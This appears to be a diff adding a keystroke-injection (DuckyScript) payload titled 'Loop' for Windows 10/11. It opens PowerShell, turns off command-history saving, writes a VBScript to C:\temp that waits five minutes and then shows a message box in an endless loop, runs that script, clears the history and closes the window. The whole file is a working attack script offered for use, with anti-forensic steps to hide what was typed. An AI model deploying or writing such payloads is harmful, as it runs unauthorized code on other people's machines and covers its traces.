@@ -1,0 +1,28 @@
+REM #####################################################
+REM #                                                   |
+REM # Title        : Loop                               |
+REM # Written By	 : CyberSauce                         |
+REM # Version      : 1.1                                |
+REM # Category     : Execution                          |
+REM # Target       : Windows 10/11                      |
+REM # Tested on    : Windows 11                         |
+REM #                                                   |
+REM #####################################################
+
+DEFAULT_DELAY 1000
+GUI r
+STRING PowerShell.exe 
+ENTER
+STRING Set-PSReadLineOption -HistorySaveStyle SaveNothing
+ENTER
+STRING New-Item -Path "c:\temp\" -ItemType Directory
+ENTER
+STRING 1..1 | ForEach-Object {'WScript.Sleep (5*60*1000)'}{'do'} {'msgbox "Around the world"'} {'loop'} >> C:\temp\cybersauce.vbs
+ENTER
+STRING cd C:\temp\
+ENTER
+STRING .\cybersauce.vbs
+ENTER
+STRING Clear-History
+ENTER
+ALT F4
